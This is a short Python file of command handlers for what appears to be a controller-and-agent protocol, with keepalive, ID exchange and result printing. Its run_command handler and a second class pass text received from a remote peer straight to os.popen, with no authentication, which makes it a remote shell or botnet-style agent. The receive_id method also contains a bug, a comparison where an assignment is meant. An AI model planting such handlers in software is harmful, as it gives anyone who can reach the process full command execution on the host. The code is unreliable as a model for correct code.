#!/usr/bin/env python

from os import popen
import sys
from time import time

class pStdCmdHandler:
    cmds = {}

    def __init__(s, srv):
        s.server = srv
        s.cmds[0] = s.send_ka
        s.cmds[1] = s.send_id
        s.cmds[2] = s.run_command

        s.cmds[128+0] = s.receive_ka
        s.cmds[128+1] = s.receive_id
        s.cmds[128+2] = s.print_command_output
    
    def send_ka(s, client, data):
        return s.server.myid

    def send_id(s, client, data):
        return s.server.myid

    def run_command(s, client, data):
        a = []
        for i in popen(data).readlines():
            a.append(i)
        return a
            

    def receive_ka(s, client, data):
        client['last_ka'] = time()
        client['id'] = data.strip().rstrip()
        return ''

    def receive_id(s, client, data):
        cid = data.strip().rstrip()
        client['id'] == cid
        return ''

    def print_command_output(s, client, data):
        sys.stdout.write("[" + client['id'] + "] => " + str(data))
        return ''

    def run(s, client, cmdid, data):
    
        cmd = s.cmds[cmdid]
        if cmdid < 128:
            return cmdid+128, cmd(client, data)
        else:
            return cmdid, cmd(client, data)
        


class pCmdHandler:
    def __init__(s, cmdid, data):
        s.cmdid = cmdid
        s.data = data
        # cmdid 2 - stdin
        # cmdid 3 - exec

    def run(s):
        if s.cmdid == 2:
            sys.stdout.write("=> " + s.data)

        elif s.cmdid == 3:
            for i in popen(s.data).readlines():
                yield i


